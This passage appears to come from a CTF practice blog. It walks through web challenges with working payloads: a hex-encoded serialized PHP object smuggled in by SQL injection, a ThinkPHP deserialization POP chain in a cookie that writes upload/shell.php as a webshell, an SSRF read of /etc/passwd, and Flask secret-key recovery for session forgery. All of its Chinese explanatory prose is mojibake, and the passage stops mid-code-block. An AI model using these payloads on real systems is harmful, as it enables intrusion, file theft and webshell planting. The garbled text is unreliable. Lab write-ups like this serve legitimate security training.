</div><p>Âõ†‰∏∫ÈÉΩÊòØprotectedÂ±ûÊÄßÁöÑÔºåÁî®<code>\0\0\0</code>ÊõøÊç¢ÔºàÊ∫êÁ†ÅÁªôÁöÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$key_temp</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$value_temp</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="o">.</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="s1">&#39;\0\0\0&#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">O:6:&#34;helper&#34;:2:{s:9:&#34;\0\0\0ifview&#34;;b:1;s:9:&#34;\0\0\0config&#34;;s:5:&#34;/flag&#34;;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊ∫êÁ†ÅÊúâËøô‰∏ÄË°å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;INSERT INTO images (&#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$sql_fields</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;) VALUES(&#34;</span><span class="o">.</span><span class="p">(</span><span class="nx">implode</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span><span class="nv">$sql_val</span><span class="p">))</span><span class="o">.</span><span class="s2">&#34;)&#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãËøîÂõûÂÄºtitileÂèØÊéß</p>
<p>ÊãºÊé•ÁÑ∂Âêé16ËøõÂà∂ÁªïËøáÂèåÂºïÂè∑waf</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d),(&#39;1.jpg
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêé‰øÆÊîπÊñá‰ª∂Âêç</p>
<p>ËÆøÈóÆshow.phpËß¶ÂèëÂèçÂ∫èÂàóÂåñ</p>
<h2 id="Âº∫ÁΩëÊùØ-2019upload">[Âº∫ÁΩëÊùØ 2019]Upload
</h2><p>ÁõÆÂΩïÊâ´Êèèwww.tar.gz</p>
<p>thinkphp5</p>
<p>profile.php‰∏ãÈù¢Êúâ‰∏§‰∏™È≠îÊúØÊñπÊ≥ï</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">except</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$name</span><span class="p">}){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$name</span><span class="p">}}(</span><span class="nv">$arguments</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>register.phpÈáåÈù¢‰πüÊúâ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">registed</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">index</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ProfileËµãÂÄºcheckerÔºåËß¶ÂèëcallÔºåÁÑ∂Âêéagrument‰∏∫Á©∫,Ëß¶ÂèëgetÔºåÁÑ∂ÂêéexceptÂèØÊéß
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂõûÊù•Áúã‰∏ä‰º†ÁöÑÈÄªËæë</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="o">=</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="o">=</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&#34;.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ext_check</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ext</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">copy</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="o">@</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filename_tmp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="o">=</span><span class="s2">&#34;../upload/</span><span class="si">$this-&gt;upload_menu</span><span class="s2">/</span><span class="si">$this-&gt;filename</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">update_img</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update_img</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$user_info</span><span class="o">=</span><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s2">&#34;ID&#34;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">profile</span><span class="p">[</span><span class="s1">&#39;ID&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$user_info</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">db</span><span class="p">(</span><span class="s1">&#39;user&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">where</span><span class="p">(</span><span class="s1">&#39;ID&#39;</span><span class="p">,</span><span class="nv">$user_info</span><span class="p">[</span><span class="s1">&#39;ID&#39;</span><span class="p">])</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">([</span><span class="s2">&#34;img&#34;</span><span class="o">=&gt;</span><span class="nx">addslashes</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">img</span><span class="p">)])</span><span class="o">-&gt;</span><span class="na">update</span><span class="p">()){</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">update_cookie</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">success</span><span class="p">(</span><span class="s1">&#39;Upload img successful!&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">(</span><span class="s1">&#39;../home&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Upload file failed!&#39;</span><span class="p">,</span> <span class="nx">url</span><span class="p">(</span><span class="s1">&#39;../index&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>            
</span></span></code></pre></td></tr></table>
</div>
</div><p>Á¨¨‰∏ÄÊ¨°‰∏ä‰º†Â∞±ËÉΩ‰Ωøempty=1ÔºåÁªïËøá<code>.png</code>ÁöÑÊãºÊé•</p>
<p>Ë¶Å‰Ωøext=1</p>
<p>index.phpÈáåÈù¢‰ºöÂèçÂ∫èÂàóÂåñcookie</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">app\web\controller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Register</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$checker</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$registed</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="c1">//ÁõÆÁöÑÊòØËøádestructÈáåÁöÑif;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Profile</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$checker</span> <span class="o">=</span><span class="mi">0</span> <span class="p">;</span><span class="c1">//ÁõÆÁöÑÊòØÁªïËøáindexÁ±ªÁöÑÊ£ÄÊü•ÔºåÈò≤Ê≠¢ÈÄÄÂá∫Á®ãÂ∫è
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">public</span> <span class="nv">$filename_tmp</span><span class="o">=</span><span class="s2">&#34;./upload/9987df285bb375eda68448315c5656e5/4a47a0db6e60853dedfcfdf08a5ca249.png&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$upload_menu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$filename</span><span class="o">=</span><span class="s2">&#34;upload/shell.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ext</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">//ÁõÆÁöÑÊòØËøáifÊù•Ë∞ÉÁî®Â§çÂà∂webshell
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">public</span> <span class="nv">$img</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$except</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;index&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;upload_img&#34;</span><span class="p">);</span><span class="c1">//ÁõÆÁöÑÊòØÈÄöËøá__get()È≠îÊúØÊñπÊ≥ïË∞ÉÁî®upload_ImgÂáΩÊï∞
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Register</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Profile</span><span class="p">();</span><span class="c1">//ÁõÆÁöÑÊòØË∞ÉÁî®POPÈìæ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">-&gt;</span><span class="na">checker</span><span class="o">=</span><span class="mi">0</span><span class="nx">Ôºõ</span><span class="c1">//Ë∞ÉÁî®popÈìæÈò≤Ê≠¢ÈÄÄÂá∫Á®ãÂ∫è
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>cookieÊõøÊç¢ÂÆåËÆøÈóÆ/upload/shell.php</p>
<h2 id="ciscn2019-Âçé‰∏úÂçóËµõÂå∫web4">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web4
</h2><p>fileÂçèËÆÆËØª‰∏çÂá∫Êù•ÔºåÁåúÊµãpythonÂÜôÁöÑÁïåÈù¢</p>
<p>Âà©Áî®<code>local_file://</code>ÂçèËÆÆËØªÊñá‰ª∂ÔºåÊàñËÄÖ‰ªÄ‰πàÈÉΩ‰∏çÁî®Áõ¥Êé•ËØªÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/read?url=local_file:///etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËØªapp.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">uuid</span><span class="o">,</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">getnode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;www-data&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;Hello World! &lt;a href=&#34;/read?url=https://baidu.com&#34;&gt;Read somethings&lt;/a&gt;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/read&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;^file.*&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">n</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">m</span> <span class="ow">or</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;No Hack&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;no response&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">flag</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;fuck&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;Access denied&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÁúãÂà∞Ë¶ÅËÆøÈóÆflagË∑ØÁî±ÔºåËÄå‰∏îsessionÈáåÈù¢ÁöÑusernameË¶Å‰∏∫fuck</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961.png"
	width="1594"
	height="613"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961_hu16669710697479349388.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250428191150961_hu6630844668066741797.png 1024w"
	loading="lazy"
	
		alt="image-20250428191150961"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="624px"
	
></p>
<p>usernameÈÇ£‰∏™Â≠óÊÆµÊòØbase64ÁºñÁ†ÅÂêéÁöÑwww-data</p>
<p>Ë¶ÅÁü•ÈÅìsecret-keyÂ∞±ËÉΩ‰º™ÈÄ†‰∫Ü</p>
<p>‰º™ÈÄ†sessionÈ¶ñÂÖàË¶ÅÊãøÂà∞secret_keyÔºåÁúã‰∏Ä‰∏ãsecret_keyÁöÑÁîüÊàêÊñπÂºè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">random.seed(uuid.getnode()) //ÁßçÂ≠êÊòØuuid.getnode(),Âç≥Êú∫Âô®ÁöÑÂõ∫ÂÆöÊ†áËØÜÁ¨¶ÔºåÊ†πÊçÆmacÂú∞ÂùÄËΩ¨Âåñ‰∏∫ÂçÅËøõÂà∂Êï∞
</span></span><span class="line"><span class="cl">app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) //ËøôÈáåÊúâ‰∫ÜÁßçÂ≠êÂ∞±ÂèØ‰ª•Ëá™Â∑±ÁîüÊàêsecret_key
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËØªÂèñ/sys/class/net/eth0/addressËé∑ÂèñmacÂú∞ÂùÄ</p>
<p>4e:46:44:62:43:f0</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="mh">0x4e46446243f0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">random</span><span class="p">()</span><span class="o">*</span><span class="mi">233</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="mf">12.498945071696037</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêéflask-session‰º™ÈÄ†</p>
<p>ËøôÈáåÊòØpy2ÁéØÂ¢É</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
